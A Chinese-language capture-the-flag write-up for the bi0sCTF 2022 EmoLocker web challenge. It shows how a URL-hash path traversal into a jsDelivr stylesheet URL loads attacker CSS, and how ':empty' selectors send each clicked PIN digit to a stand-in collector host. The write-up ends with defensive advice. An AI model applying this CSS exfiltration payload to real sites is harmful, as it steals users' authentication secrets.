# bi0sCTF 2022 EmoLocker Writeup

## 题目简述

EmoLocker 使用十个 emoji 编号作为管理员 PIN。管理员机器人会打开同源题目 URL、输入用户名 `admin`，再依次点击秘密 PIN 对应的 emoji。登录成功后，后端把 flag 直接写入 `HttpOnly` 的 `auth` Cookie。

漏洞链由两部分组成：页面把 URL hash 拼入 jsDelivr 样式表地址，允许借助 CDN 路径规范化加载攻击者控制的 CSS；React 点击处理器又会清空被点击 emoji 的 `innerHTML`，使 CSS 的 `:empty` 选择器成为点击序列侧信道。

## 解题过程

### 找到可控的样式表 URL

前端在 hash 变化时执行：

```javascript
let href = `https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/${
    window.location.hash.replace("#", "")
}-mode.css`;
link_obj.href = href;
```

hash 没有经过路径约束。jsDelivr 同时支持 npm 与 GitHub 资源路径；令 hash 为类似下面的值：

```text
../../../../gh/USER/REPOSITORY@main/payload
```

浏览器和 CDN 对 `../` 进行规范化后，最终会请求 GitHub 仓库中的 `payload-mode.css`。因此，攻击者可以控制页面加载的整张样式表，而不需要执行 JavaScript。

### 用 :empty 泄露点击顺序

每个 emoji 最终渲染成带编号的 span，例如：

```html
<span role="img" aria-label="51">...</span>
```

点击处理器的第一条语句是：

```javascript
e.target.innerHTML = "";
```

也就是说，某个编号一旦被点击，对应 span 就从“包含 emoji 文本”变成 `:empty`。为所有可能编号生成不同的外带 URL：

```css
span[role="img"][aria-label="1"]:empty {
  background-image: url("https://COLLECTOR.EXAMPLE/leak?item=1");
}

span[role="img"][aria-label="2"]:empty {
  background-image: url("https://COLLECTOR.EXAMPLE/leak?item=2");
}

/* 按相同模式覆盖题目 emoji.json 中的全部编号。 */
```

把 CSS 保存为 `payload-mode.css`，再向机器人提交带有上述 hash 的题目同源 URL。机器人每点击一个 emoji，就有一个新元素命中 `:empty`，浏览器随即请求该编号专属的背景图。按收集端日志的到达顺序得到：

```text
51, 32, 73, 34, 85, 126, 17, 158, 79, 50
```

这里应使用自己控制的收集端，并为每个编号使用唯一 URL；不要把赛后文章中的一次性 webhook 地址复制进长期归档。仓库中的 `exploit_generator.py` 正是按编号生成这些 CSS 规则。

### 以管理员身份登录

后端把提交的 PIN 做 `JSON.stringify` 后逐字节比较。恢复完整顺序后，向自己的会话提交：

```http
POST /api/login HTTP/1.1
Content-Type: application/json

{"username":"admin","pin":[51,32,73,34,85,126,17,158,79,50]}
```

响应正文只有 `Welcome admin !`，真正的 flag 位于 `Set-Cookie`：

```text
auth=bi0sCTF{a34522e2009192570c840f931e4c3c0a}; HttpOnly
```

`HttpOnly` 只禁止页面 JavaScript 读取 Cookie，不会隐藏 HTTP 响应头；可以在代理、浏览器存储面板或命令行客户端的响应头中查看。仓库 Dockerfile 中的固定 `EMOPIN` 与上述 CSS 泄露顺序一致，也确认了 flag 的大小写。

官方赛后文章进一步解释了 jsDelivr 的 GitHub 路径跳转与 CSS Exfiltration 组合：[EmoLocker 官方题解](https://blog.bi0s.in/2023/01/23/Web/bi0sCTF22-Emo-Locker/)。本文已将其中决定性条件、选择器和登录请求完整写入正文。

## 方法总结

本题不需要读取管理员 Cookie，也不依赖 XSS。攻击者控制样式表后，利用 DOM 属性和 `:empty` 状态把管理员的每次点击转换为一条外部图片请求，先恢复认证因子，再在自己的会话中正常登录。

防御上，不能把 hash 原样拼进资源路径；应使用固定允许列表选择主题。敏感输入控件也不应让点击历史通过稳定 DOM 状态暴露给第三方 CSS，且 CSP 应限制 `style-src` 与 `img-src` 到可信源。
